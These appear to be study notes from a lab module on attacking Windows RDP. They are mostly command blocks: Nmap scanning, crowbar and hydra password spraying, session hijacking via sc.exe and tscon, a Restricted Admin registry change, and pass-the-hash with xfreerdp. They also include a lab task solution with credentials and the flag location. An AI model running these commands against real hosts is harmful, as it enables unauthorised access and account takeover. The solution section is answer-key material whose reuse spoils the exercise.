### Attacking RDP

```
# Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft 
# which provides a user with a graphical interface to connect to another computer over a network connection.
# It is also one of the most popular administration tools, allowing system administrators 
# to centrally control their remote systems with the same functionality as if they were on-site.
```

```
# By default, RDP uses port TCP/3389. Using Nmap, we can identify the available RDP service on the target host:

sudo nmap -Pn -p3389 192.168.2.143   # With host discovery disabled (-Pn) option
```

[crowbar](https://github.com/galkan/crowbar)

```
# Using the Crowbar tool, we can perform a password spraying attack against the RDP service. 
# As an example below, the password password123 will be tested against a list of usernames in the usernames.txt file. 
# The attack found the valid credentials as administrator : password123 on the target RDP host.
```

```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'  # Crowbar - RDP Password Spraying
```

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp           # Hydra - RDP Password Spraying 
```

### RDP Login

```
rdesktop -u admin -p password123 192.168.2.143
```

### Protocol Specific Attacks 

```
# RDP Session Hijacking

# e.g. we are logged in as the user juurena (UserID = 2) who has Administrator privileges. 
# Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.

PS C:\whoami
PS C:\query user
```

```
# To successfully impersonate a user without their password, 
# we need to have SYSTEM privileges and use the Microsoft tscon.exe binary 
# that enables users to connect to another desktop session. 
# It works by specifying which SESSION ID (4 for the lewen session in our example) 
# we would like to connect to which session name (rdp-tcp#13, which is our current session).

C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

```
# If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, 
# such as PsExec or Mimikatz. 
# A simple trick is to create a Windows service that, by default, will run as Local System 
# and will execute any binary with SYSTEM privileges. 

# We will use Microsoft sc.exe binary. 
# First, we specify the service name (sessionhijack) and the binpath, 
# which is the command we want to execute. 
# Once we run the following command, a service named sessionhijack will be created.

C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

```
# To run the command, we can start the sessionhijack service :

C:\htb> net start sessionhijack
```

```
# Once the service is started, a new terminal with the lewen user session will appear. 
# With this new account, we can attempt to discover what kind of privileges it has on the network, 
# and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts
# or even a Domain Admin.
```

### RDP Pass-the-Hash (PtH)

```
# What if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, 
# and we could not crack the hash to reveal the plaintext password? 
# In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
```

```
# Restricted Admin Mode, which is disabled by default, should be enabled on the target host; 
# otherwise, we will be prompted with permission error

# This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under:

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
```

```
# Adding the DisableRestrictedAdmin Registry Key

C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
# the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### Task Solution

```
10.129.203.13

xfreerdp /v:10.129.203.13 /u:htb-rdp /p:HTBRocks!   # connect with provided creds
# copy filename with extension from desktop
# DisableRestrictedAdmin Registry Key

# Disable for future admin session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# not workin , access denied
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

# bruteforce admin pass with resource pass file.
hydra -l administrator -P /home/user/atck-common-svs/pws.list 10.129.203.13 rdp   

# And after that I realized that I didn't check what in a file on desktop.. 

xfreerdp /v:10.129.203.13 /u:administrator /pth:30E14B9...

flag.txt on desktop
```

### Latest RDP Vulnerabilities

```
# In 2019, a critical vulnerability was published in the RDP (TCP/3389) 
# service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. 
# This vulnerability is known as BlueKeep. 
# It does not require prior access to the system to exploit the service for our purposes. 
```

### The Concept of the Attack

```
# The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. 
# However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. 
# Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. 
# This is known as a Use-After-Free (UAF) technique that uses freed memory to execute arbitrary code.
```

```
# This attack involves many different steps in the kernel of the operating system, 
# which are not of great importance here for the time being to understand the concept behind it. 
# After the function has been exploited and the memory has been freed, data is written to the kernel, 
# which allows us to overwrite the kernel memory. 
# This memory is used to write our instructions into the freed memory and let the CPU execute them. 
# If we want to look at the technical analysis of the BlueKeep vulnerability, this article below provides a nice overview.
```
